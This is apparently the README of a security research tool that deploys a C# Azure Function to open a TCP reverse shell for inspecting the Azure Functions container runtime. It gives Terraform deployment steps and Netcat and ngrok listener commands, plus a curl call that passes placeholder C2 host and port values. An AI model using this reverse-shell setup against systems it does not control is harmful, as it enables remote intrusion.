# Puma Prey Cougar

Cougar is a C# function that can be deployed to the Azure to establish a TCP reverse shell for the purposes of introspecting the Azure Functions container runtime.

## Installing Prerequisites

* [.NET 6 SDK](https://dotnet.microsoft.com/download)
* [Azure CLI](https://github.com/Azure/azure-cli)
* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)

## Deploying The Function

```bash
az login
export TF_VAR_unique_identifier=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}')
cd ./cougar/src/terraform/
terraform init
terraform apply --auto-approve
```

## Function Testing

Retrieve the Function Id, Host, and API key via the CLI.

```bash
export COUGAR_FUNCTION_ID=$(terraform output --json | jq -r '.cougar_function_id.value')
export COUGAR_FUNCTION_HOST=$(terraform output --json | jq -r '.cougar_function_host.value')
export COUGAR_API_KEY=$(az rest --method post --uri "$COUGAR_FUNCTION_ID/host/default/listKeys?api-version=2018-11-01" | jq -r .functionKeys.default)
export COUGAR_FUNCTION_URL="https://$COUGAR_FUNCTION_HOST/api/Cougar"
curl "$COUGAR_FUNCTION_URL?code=$COUGAR_API_KEY"
```

The result should show an error message indicating required C2 parameters are missing:

```json
{"message":"Must provide the host and port for the target TCP server as query parameters."}
```

If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:

```bash
../../../script/prey.sh cougar --url $COUGAR_FUNCTION_URL --api-key $COUGAR_API_KEY
```

See [here](../script/USAGE.md) for more details on how to use this script.

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

Then, to make your listener accessible from the public internet, consider using a service like ngrok:

```bash
ngrok tcp 4444
```

Finally, invoke your function, supplying your connection details and API key:

```bash
curl "$COUGAR_FUNCTION_URL?code=$COUGAR_API_KEY&host=NGROK_PORT_IP&port=NGROK_PORT_NUMBER"
```

Your listener will now act as a reverse shell for the duration of the function invocation.

## Teardown

```bash
terraform destroy
```

## Learning More

Read [documentation](docs) on what you can accomplish once you connect to the runtime via Cougar.
